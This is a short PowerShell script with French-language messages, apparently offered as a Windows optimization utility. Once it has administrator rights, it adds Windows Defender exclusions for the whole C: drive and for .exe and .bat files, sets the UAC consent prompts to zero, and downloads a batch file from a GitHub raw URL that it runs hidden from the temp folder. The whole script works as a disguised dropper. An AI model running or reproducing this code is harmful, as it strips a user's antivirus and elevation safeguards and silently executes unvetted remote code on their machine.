$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    chcp 65001 > $null
    Write-Host "`nPour pouvoir utiliser l'utilitaire, vous devez etre un administrateur executant une session de console."
    Write-Host "`n"
    chcp 850 > $null
} else {
    set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
    $registryPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
    powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
    powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"
    powershell -Command "Add-MpPreference -ExclusionExtension '.bat'"
    Set-ItemProperty -Path $registryPath -Name "ConsentPromptBehaviorAdmin" -Value 0
    Set-ItemProperty -Path $registryPath -Name "ConsentPromptBehaviorUser" -Value 0
    iwr -useb raw.githubusercontent.com/FRXliam/Windows-opti/main/script.bat -o $env:TEMP\opti.bat; saps $env:TEMP\opti.bat -WindowStyle Hidden
}



